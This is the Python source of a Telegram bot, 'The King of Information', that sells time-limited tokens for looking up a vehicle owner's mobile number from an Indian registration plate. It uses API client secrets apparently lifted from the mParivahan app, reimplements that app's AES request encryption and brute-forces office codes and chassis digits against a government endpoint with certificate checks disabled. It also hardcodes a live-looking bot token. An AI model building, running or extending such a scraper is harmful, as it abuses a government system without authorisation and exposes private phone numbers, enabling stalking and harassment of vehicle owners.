#!/usr/bin/env python3
"""
👑 THE KING OF INFORMATION - VEHICLE INFO BOT
Credit System + Vehicle Number to Mobile
"""

import sys
import json
import re
import time
import base64
import threading
import os
import urllib3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError
from datetime import datetime, timedelta
import pytz
import telebot
from telebot import types

# ==================== CRYPTO IMPORTS ====================
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

urllib3.disable_warnings()

# ==================== CONFIG ====================
BOT_TOKEN = "8415742587:AAFtsM3XYynwaWUhX_EgV4Wx2phx11uUK6U"
OWNER_ID = 8935807032
OWNER_USERNAME = "@VATEROFWHOLETG"

# ==================== VEHICLE API CONSTANTS ====================
P, C, S = '!~)#@*&^', 'b91c303443f61b37106750823881cd2f', 'de83eeeb148878ae375f28756492e8a0'
G = 'https://delhigw.napix.gov.in/nic/parivahan'
U = G + '/mparivahan/wrapperapi/vahan/vahancapi/updatemobile/getMobileNo'
HP = G + '/mparivahan/wrapperapi/vahan/vahancapi/hpt/search'
QC = G + '/mparivahan/wrapperapi/vahan/vahancapi/updatemobile/getclassanddescription'
A, V, DG, AL = 'okhttp/5.0.0-alpha.11', '2.0.142', '0123456789', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
ST = frozenset('AN AP AR AS BR CG CH DD DL DN GA GJ HP HR JH JK KA KL LA LD MH ML MN MP MZ NL OD OR PB PY RJ SK TN TR TS UA UK UP WB'.split())
O = {'HR26': '70', 'HR38': '70', 'HR55': '70', 'HR72': '70', 'HR76': '70', 'RJ60': '14', 'DL10': '10', 'DL1': '1', 'UK18': '18', 'UA18': '18'}
RX = re.compile(r'^(?:\d{2}BH\d{4}[A-Z]{2}|[A-Z]{2}\d{1,2}[A-Z]{0,3}\d{1,4}|[A-Z]{3}\d{1,4})$')

_lk, _tk, _ts, _slk = threading.Lock(), None, 0.0, threading.Lock()
_gs = _gx = None
_sem = threading.Semaphore(48)

# ==================== DATABASE ====================
USER_FILE = "root_data.json"
TOKEN_FILE = "tokens.json"
CACHE_FILE = "root_cache.json"
WELCOME_FILE = "welcome_info.json"
IST = pytz.timezone('Asia/Kolkata')

def load_json(f, default):
    try:
        with open(f, "r") as fp:
            return json.load(fp)
    except:
        return default

def save_json(f, data):
    with open(f, "w") as fp:
        json.dump(data, fp, indent=2)

def get_users():
    return load_json(USER_FILE, {})

def save_users(d):
    save_json(USER_FILE, d)

def get_tokens():
    return load_json(TOKEN_FILE, {})

def save_tokens(d):
    save_json(TOKEN_FILE, d)

def get_cache():
    return load_json(CACHE_FILE, {"results": {}})

def save_cache(d):
    save_json(CACHE_FILE, d)

def get_welcome():
    return load_json(WELCOME_FILE, {"photo": None, "caption": None})

def save_welcome(d):
    save_json(WELCOME_FILE, d)

def get_ist_now():
    return datetime.now(IST)

def _is_active_exp(exp):
    try:
        exp_dt = datetime.fromisoformat(exp)
        if exp_dt.tzinfo is None:
            exp_dt = IST.localize(exp_dt)
        return get_ist_now() < exp_dt
    except:
        return False

# ==================== USER MANAGEMENT ====================
def get_user(user_id):
    users = get_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {
            "id": user_id,
            "username": None,
            "first_name": None,
            "expiry": None,
            "joined_at": get_ist_now().isoformat(),
            "total_searches": 0,
            "token_used": None
        }
        save_users(users)
    return users[uid]

def update_user(user_id, updates):
    users = get_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {"id": user_id}
    users[uid].update(updates)
    save_users(users)

def is_user_active(user_id):
    user = get_user(user_id)
    expiry = user.get("expiry")
    if not expiry:
        return False
    return _is_active_exp(expiry)

def get_remaining_time(user_id):
    user = get_user(user_id)
    expiry = user.get("expiry")
    if not expiry:
        return None
    try:
        exp_dt = datetime.fromisoformat(expiry)
        if exp_dt.tzinfo is None:
            exp_dt = IST.localize(exp_dt)
        if get_ist_now() >= exp_dt:
            return None
        diff = exp_dt - get_ist_now()
        days = diff.days
        hours = diff.seconds // 3600
        minutes = (diff.seconds % 3600) // 60
        return f"{days}d {hours}h {minutes}m"
    except:
        return None

# ==================== TOKEN MANAGEMENT ====================
def generate_token(days):
    import secrets, string
    chars = string.ascii_uppercase + string.digits
    token = "KING-" + ''.join(secrets.choice(chars) for _ in range(12))
    tokens = get_tokens()
    tokens[token] = {
        "days": days,
        "created_at": get_ist_now().isoformat(),
        "created_by": OWNER_ID,
        "used_by": None,
        "used_at": None,
        "is_used": False
    }
    save_tokens(tokens)
    return token

def redeem_token(user_id, token):
    token = token.strip().upper()
    tokens = get_tokens()
    if token not in tokens:
        return {"success": False, "message": "❌ Invalid token."}

    tdata = tokens[token]
    if tdata.get("is_used"):
        return {"success": False, "message": "❌ Token already used."}

    days = tdata["days"]

    if is_user_active(user_id):
        current_exp = get_user(user_id).get("expiry")
        base = datetime.fromisoformat(current_exp)
        if base.tzinfo is None:
            base = IST.localize(base)
    else:
        base = get_ist_now()

    new_expiry = base + timedelta(days=days)

    tdata["is_used"] = True
    tdata["used_by"] = user_id
    tdata["used_at"] = get_ist_now().isoformat()
    tokens[token] = tdata
    save_tokens(tokens)

    update_user(user_id, {
        "expiry": new_expiry.isoformat(),
        "token_used": token
    })

    return {
        "success": True,
        "message": f"✅ Token redeemed!\n\n⏱ Duration: {days} days\n📅 Expires: {new_expiry.strftime('%d %b %Y, %I:%M %p')} IST\n\n🔥 Unlimited access activated!"
    }

# ==================== VEHICLE INFO ENGINE ====================
def K(t):
    r = t[::-1]
    return ((r if len(r) <= 3 else r[:4] + r[-4:]) + P).encode()

def E(o, t):
    return base64.b64encode(
        base64.b64encode(
            AES.new(K(t), AES.MODE_ECB).encrypt(
                pad(json.dumps(o, separators=(',', ':')).encode(), 16)
            )
        )
    ).decode()

def X(b, t):
    raw = base64.b64decode(b)
    try:
        r2 = base64.b64decode(raw)
        if len(r2) % 16 == 0:
            raw = r2
    except:
        pass
    return json.loads(unpad(AES.new(K(t), AES.MODE_ECB).decrypt(raw), 16))

def N(r):
    return re.sub(r'[\s\-]', '', r.upper())

def STT(r):
    if re.match(r'^\d{2}BH', r):
        return 'DL'
    s = r[:2]
    return s if s in ST else 'DL'

def OS(x):
    if x is None or x == '':
        return
    try:
        return str(int(x))
    except:
        return str(x)

def PO(r):
    if re.match(r'^\d{2}BH', r):
        return
    for k, v in sorted(O.items(), key=lambda x: -len(x[0])):
        if r.startswith(k):
            return v
    m = re.match(r'^[A-Z]{2}(\d{1,2})', r)
    if m:
        d = m.group(1)
        return d.zfill(2) if len(d) == 1 else d
    m = re.search(r'(\d{1,2})', r[2:] if len(r) > 2 else r)
    if m:
        d = m.group(1)
        return d.zfill(2) if len(d) == 1 else d
    return '1'

def OF(r, e=None):
    o = []
    def a(x):
        x = OS(x)
        if x and x not in o:
            o.append(x)
    a(e)
    p = PO(r)
    if p:
        a(p)
        a(p.lstrip('0') or '0')
        a(str(p).zfill(2))
    for x in ('14', '10', '1', '16', '20', '70'):
        a(x)
    return o

def SS():
    global _gs
    if _gs is None:
        with _lk:
            if _gs is None:
                s = requests.Session()
                s.verify = False
                s.headers['User-Agent'] = A
                ad = requests.adapters.HTTPAdapter(pool_connections=48, pool_maxsize=48, max_retries=0)
                s.mount('https://', ad)
                s.mount('http://', ad)
                _gs = s
    return _gs

def GX(n=40):
    global _gx
    if _gx is None:
        _gx = ThreadPoolExecutor(max_workers=n)
    return _gx

def TK(f=0):
    global _tk, _ts
    with _lk:
        if not f and _tk and time.time() - _ts < 2800:
            return _tk
        for i in range(6):
            try:
                r = SS().post(
                    G + '/oauth2/token',
                    data={'grant_type': 'client_credentials', 'scope': 'napix', 'client_id': C, 'client_secret': S},
                    headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': A},
                    timeout=(10, 25)
                )
                if r.status_code == 200:
                    t = r.json().get('access_token')
                    if t:
                        _tk, _ts = t, time.time()
                        return t
            except requests.RequestException:
                time.sleep(.2 * (i + 1))
        return None

def P1(u, t, o):
    ts = str(int(time.time() * 1000))
    h = {'Authorization': 'Bearer ' + t, 'Timestamp': ts, 'Param1': 'null', 'Param2': V,
         'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json', 'User-Agent': A}
    z = None
    for i in range(4):
        try:
            with _sem:
                z = SS().post(u, headers=h, data=json.dumps({'data': E(o, ts)}), timeout=(10, 25))
            break
        except requests.RequestException:
            time.sleep(.12 * (i + 1))
    return z, ts

def T1(r, o, c, t, s):
    z, ts = P1(U, t, {'regnNo': r, 'stateCode': s, 'chassisNo': str(c), 'officeCode': str(o), 'purCd': '135'})
    if z is None:
        return None, 0, 0
    if z.status_code == 401:
        return None, 0, 1
    if z.status_code != 200:
        return None, 0, 0
    try:
        d = X(z.json()['data'], ts)
    except:
        return None, 0, 0
    a = d.get('data') if isinstance(d, dict) else None
    ok = isinstance(a, dict) and a.get('mobileNo') not in (None, '')
    return (d if ok else None), int(ok), 0

def HO(r, t):
    z, ts = P1(HP, t, {'regnNo': r})
    if z is None or z.status_code != 200:
        return
    try:
        d = X(z.json()['data'], ts)
    except:
        return
    a = d.get('data') if isinstance(d, dict) else None
    h = a.get('hptdetails') if isinstance(a, dict) else None
    if isinstance(h, list):
        h = h[0] if h else None
    return OS(h.get('off_cd')) if isinstance(h, dict) else None

def EXS(r, t, s):
    z, ts = P1(QC, t, {'regnNo': r, 'stateCode': s})
    if z is None or z.status_code != 200:
        return 1
    try:
        d = X(z.json()['data'], ts)
    except:
        return 1
    m = d.get('apiMessage') if isinstance(d, dict) else None
    return isinstance(m, dict) and m.get('statusCode') == 200

def F(r, full=0):
    r = N(r)
    t = TK()
    if not t:
        return
    s = STT(r)
    sp = threading.Event()
    bx = []
    tr = set()

    def one(o, c):
        if sp.is_set():
            return
        d, ok, af = T1(r, o, c, t, s)
        if af:
            t2 = TK(1)
            if t2:
                d, ok, _ = T1(r, o, c, t2, s)
        if ok and d:
            bx.append(d)
            sp.set()

    def br(ofs, ch=DG):
        fs = []
        for o in ofs:
            o = OS(o)
            if not o:
                continue
            for c in ch:
                k = o + ':' + c
                if k in tr:
                    continue
                tr.add(k)
                fs.append(GX().submit(one, o, c))
        if not fs:
            return 0
        for f in as_completed(fs):
            if bx:
                sp.set()
                for x in fs:
                    x.cancel()
                return 1
        return int(bool(bx))

    p = PO(r)
    w = []
    if p:
        w.append(p)
        u = p.lstrip('0') or '0'
        if u != p:
            w.append(u)
    hf = GX().submit(HO, r, t)
    if br(w):
        return bx[0]
    try:
        hf = hf.result(timeout=8)
    except:
        hf = None
    if hf and br([hf]):
        return bx[0]
    if hf and br([hf], AL):
        return bx[0]
    if br(OF(r, hf)):
        return bx[0]
    if full:
        if not EXS(r, t, s):
            return
        if br([str(i) for i in range(1, 100)]):
            return bx[0]
    return bx[0] if bx else None

def mob(d):
    if d and isinstance(d.get('data'), dict):
        m = d['data'].get('mobileNo')
        if m not in (None, ''):
            return m

# ==================== BOT SETUP ====================
print("✅ Imports OK")

bot = telebot.TeleBot(BOT_TOKEN)
try:
    bot.remove_webhook()
    print("✅ Webhook removed")
except Exception as e:
    print(f"⚠️ Webhook: {e}")

print("✅ Bot initialized")

# ==================== BOT COMMANDS ====================

@bot.message_handler(commands=['start'])
def start(message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or "User"
        first_name = message.from_user.first_name or "User"

        get_user(user_id)
        update_user(user_id, {"username": username, "first_name": first_name})

        if user_id == OWNER_ID:
            show_owner_menu(message)
            return

        if not is_user_active(user_id):
            markup = types.InlineKeyboardMarkup(row_width=1)
            markup.add(types.InlineKeyboardButton("🔑 Redeem Token", callback_data="user_redeem"))
            markup.add(types.InlineKeyboardButton("👑 Contact Owner", url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}"))

            text = f"""👑 <b>THE KING OF INFORMATION</b> 👑

━━━━━━━━━━━━━━━━━━━━━
🔒 <b>Access Required</b>

Aapke paas valid token nahi hai.
Token redeem karo ya owner se contact karo.

<b>📌 Owner:</b> {OWNER_USERNAME}
━━━━━━━━━━━━━━━━━━━━━
"""
            bot.reply_to(message, text, reply_markup=markup, parse_mode='HTML')
            return

        show_user_menu(message)
    except Exception as e:
        print(f"❌ Start error: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")

def show_user_menu(message):
    user_id = message.from_user.id
    remaining = get_remaining_time(user_id) or "Expired"
    total = get_user(user_id).get("total_searches", 0)

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🔍 Search Vehicle", callback_data="search_vehicle"))
    markup.add(types.InlineKeyboardButton("📊 My Stats", callback_data="my_stats"))
    markup.add(types.InlineKeyboardButton("👑 Contact Owner", url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}"))

    text = f"""👑 <b>THE KING OF INFORMATION</b> 👑

━━━━━━━━━━━━━━━━━━━━━
✅ <b>Access Active</b>
⏱ Remaining: <b>{remaining}</b>
📊 Total Searches: <b>{total}</b>
━━━━━━━━━━━━━━━━━━━━━

<b>🔍 Vehicle Number Search</b>
Send vehicle number to get owner's mobile number.

Example: <code>HR26AB1234</code>
"""
    bot.reply_to(message, text, reply_markup=markup, parse_mode='HTML')

def show_owner_menu(message):
    user_id = message.from_user.id
    users = get_users()
    tokens = get_tokens()
    active = sum(1 for u in users.values() if u.get('expiry') and _is_active_exp(u.get('expiry')))

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🎫 Generate Token", callback_data="owner_gen"),
        types.InlineKeyboardButton("📋 All Tokens", callback_data="owner_tokens")
    )
    markup.add(
        types.InlineKeyboardButton("👥 All Users", callback_data="owner_users"),
        types.InlineKeyboardButton("📊 Statistics", callback_data="owner_stats")
    )
    markup.add(
        types.InlineKeyboardButton("📸 Set Welcome Photo", callback_data="owner_photo"),
        types.InlineKeyboardButton("📝 Set Caption", callback_data="owner_caption")
    )

    text = f"""👑 <b>OWNER PANEL</b> 👑

━━━━━━━━━━━━━━━━━━━━━
👥 Total Users: <b>{len(users)}</b>
✅ Active Users: <b>{active}</b>
🎫 Total Tokens: <b>{len(tokens)}</b>
━━━━━━━━━━━━━━━━━━━━━

<b>Commands:</b>
/generate [days] - Create token
/users - List all users
/tokens - List all tokens
/stats - Statistics
/setcaption [text] - Set welcome caption
"""
    bot.reply_to(message, text, reply_markup=markup, parse_mode='HTML')

# ==================== OWNER COMMANDS ====================

@bot.message_handler(commands=['generate'])
def generate_token_cmd(message):
    try:
        if message.from_user.id != OWNER_ID:
            bot.reply_to(message, "❌ Owner only.")
            return

        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /generate [days]\nExample: /generate 1")
            return

        raw = parts[1].lower().rstrip('d')
        try:
            days = int(raw)
            if days < 1 or days > 365:
                bot.reply_to(message, "❌ Days must be 1-365.")
                return
        except:
            bot.reply_to(message, "❌ Invalid number.")
            return

        token = generate_token(days)

        text = f"""✅ <b>TOKEN GENERATED</b>

🎫 Token: <code>{token}</code>
⏱ Duration: <b>{days} days</b>
📅 Created: {get_ist_now().strftime('%d %b %Y, %I:%M %p')} IST

<b>Send this to user:</b>
<code>/redeem {token}</code>
"""
        bot.reply_to(message, text, parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")

@bot.message_handler(commands=['users'])
def list_users(message):
    try:
        if message.from_user.id != OWNER_ID:
            return

        users = get_users()
        if not users:
            bot.reply_to(message, "📭 No users.")
            return

        text = "👥 <b>ALL USERS</b>\n\n"
        for uid, u in list(users.items())[-20:]:
            name = u.get('first_name') or u.get('username') or "Unknown"
            expiry = u.get('expiry')
            status = "✅" if expiry and _is_active_exp(expiry) else "❌"
            searches = u.get('total_searches', 0)
            text += f"{status} <code>{uid}</code> - {name}\n"
            text += f"   📊 Searches: {searches}\n"

        if len(users) > 20:
            text += f"\n... and {len(users) - 20} more"

        bot.reply_to(message, text, parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")

@bot.message_handler(commands=['tokens'])
def list_tokens(message):
    try:
        if message.from_user.id != OWNER_ID:
            return

        tokens = get_tokens()
        if not tokens:
            bot.reply_to(message, "📭 No tokens.")
            return

        text = "🎫 <b>ALL TOKENS</b>\n\n"
        for token, t in list(tokens.items())[-20:]:
            status = "✅ Used" if t.get('is_used') else "🟢 Available"
            text += f"{status} <code>{token}</code>\n"
            text += f"   ⏱ {t['days']} days"
            if t.get('used_by'):
                text += f" | 👤 {t['used_by']}"
            text += "\n"

        bot.reply_to(message, text, parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    try:
        if message.from_user.id != OWNER_ID:
            return

        users = get_users()
        tokens = get_tokens()
        total_searches = sum(u.get('total_searches', 0) for u in users.values())
        active = sum(1 for u in users.values() if u.get('expiry') and _is_active_exp(u.get('expiry')))

        text = f"""📊 <b>STATISTICS</b>

👥 Total Users: <b>{len(users)}</b>
✅ Active Users: <b>{active}</b>
🎫 Total Tokens: <b>{len(tokens)}</b>
✅ Used Tokens: <b>{sum(1 for t in tokens.values() if t.get('is_used'))}</b>
🟢 Available Tokens: <b>{sum(1 for t in tokens.values() if not t.get('is_used'))}</b>
🔍 Total Searches: <b>{total_searches}</b>
"""
        bot.reply_to(message, text, parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")

@bot.message_handler(commands=['redeem'])
def redeem_cmd(message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /redeem [token]")
            return

        token = parts[1].strip().upper()
        user_id = message.from_user.id
        get_user(user_id)
        result = redeem_token(user_id, token)
        bot.reply_to(message, result['message'])

        if result['success']:
            show_user_menu(message)
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")

@bot.message_handler(commands=['setcaption'])
def set_caption(message):
    try:
        if message.from_user.id != OWNER_ID:
            return
        caption = message.text.replace("/setcaption", "", 1).strip()
        if not caption:
            bot.reply_to(message, "❌ Usage: /setcaption your text")
            return
        welcome = get_welcome()
        welcome["caption"] = caption
        save_welcome(welcome)
        bot.reply_to(message, "✅ Caption updated!")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")

# ==================== CALLBACKS ====================

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        user_id = call.from_user.id
        data = call.data

        if data == "user_redeem":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(call.message.chat.id, "🔑 Enter token:\nExample: KING-XXXXXXXXXXXX")
            bot.register_next_step_handler(msg, process_redeem)

        elif data == "search_vehicle":
            bot.answer_callback_query(call.id)
            if not is_user_active(user_id):
                bot.send_message(call.message.chat.id, "❌ No active access. Redeem token first.")
                return
            msg = bot.send_message(call.message.chat.id, "🔍 Send vehicle number:\nExample: HR26AB1234")
            bot.register_next_step_handler(msg, process_search)

        elif data == "my_stats":
            bot.answer_callback_query(call.id)
            user = get_user(user_id)
            remaining = get_remaining_time(user_id) or "Expired"
            text = f"""📊 <b>MY STATS</b>

👤 Name: {user.get('first_name', 'Unknown')}
🆔 ID: <code>{user_id}</code>
⏱ Access: <b>{remaining}</b>
🔍 Total Searches: <b>{user.get('total_searches', 0)}</b>
📅 Joined: {user.get('joined_at', '')[:10]}
"""
            bot.send_message(call.message.chat.id, text, parse_mode='HTML')

        elif data == "owner_gen":
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "🎫 Usage: /generate [days]\nExample: /generate 1")

        elif data == "owner_tokens":
            bot.answer_callback_query(call.id)
            list_tokens(call.message)

        elif data == "owner_users":
            bot.answer_callback_query(call.id)
            list_users(call.message)

        elif data == "owner_stats":
            bot.answer_callback_query(call.id)
            show_stats(call.message)

        elif data == "owner_photo":
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "📸 Send a photo to set as welcome image.")

        elif data == "owner_caption":
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "📝 Usage: /setcaption [your caption]")
    except Exception as e:
        print(f"❌ Callback error: {e}")

# ==================== PROCESS FUNCTIONS ====================

def process_redeem(message):
    try:
        token = message.text.strip().upper()
        user_id = message.from_user.id
        get_user(user_id)
        result = redeem_token(user_id, token)
        bot.reply_to(message, result['message'])
        if result['success']:
            show_user_menu(message)
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")

def process_search(message):
    try:
        user_id = message.from_user.id
        if not is_user_active(user_id):
            bot.reply_to(message, "❌ No active access.")
            return

        vehicle = N(message.text.strip())
        if not RX.match(vehicle):
            bot.reply_to(message, "❌ Invalid vehicle number format.")
            return

        cache = get_cache()
        cached = cache.get("results", {}).get(vehicle)
        if cached:
            bot.reply_to(message, f"📱 <b>Mobile:</b> <code>{cached}</code>", parse_mode='HTML')
            return

        msg = bot.reply_to(message, f"🔍 Searching {vehicle}...")

        try:
            with ThreadPoolExecutor(max_workers=1) as ex:
                future = ex.submit(F, vehicle, 1)
                result = future.result(timeout=25)
        except TimeoutError:
            bot.edit_message_text(f"⏱ Timeout for {vehicle}", message.chat.id, msg.message_id)
            return

        mobile = mob(result) if result else None

        if mobile:
            cache = get_cache()
            cache.setdefault("results", {})[vehicle] = mobile
            save_cache(cache)

            user = get_user(user_id)
            update_user(user_id, {"total_searches": user.get("total_searches", 0) + 1})

            text = f"""✅ <b>FOUND!</b>

🚗 Vehicle: <code>{vehicle}</code>
📱 Mobile: <code>{mobile}</code>

━━━━━━━━━━━━━━━━━━━━━
👑 THE KING OF INFORMATION
"""
            bot.edit_message_text(text, message.chat.id, msg.message_id, parse_mode='HTML')
        else:
            bot.edit_message_text(f"❌ Mobile number not found for {vehicle}", message.chat.id, msg.message_id)
    except Exception as e:
        print(f"❌ Search error: {e}")

# ==================== PHOTO HANDLER ====================

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    try:
        if message.from_user.id != OWNER_ID:
            return
        file_id = message.photo[-1].file_id
        welcome = get_welcome()
        welcome["photo"] = file_id
        save_welcome(welcome)
        bot.reply_to(message, "✅ Welcome photo updated!")
    except Exception as e:
        print(f"❌ Photo error: {e}")

# ==================== MAIN ====================
def main():
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║   👑 THE KING OF INFORMATION                                ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    print(f"✅ Owner: {OWNER_ID}")
    print(f"✅ Bot starting...")

    print("⏳ Fetching API token...")
    try:
        if TK():
            print("✅ API Token ready!")
        else:
            print("⚠️ API Token failed - will retry on demand")
    except Exception as e:
        print(f"⚠️ Token error: {e}")

    print("✅ Bot is now polling...")

    while True:
        try:
            bot.infinity_polling(timeout=10, long_polling_timeout=10)
        except Exception as e:
            print(f"❌ Polling error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
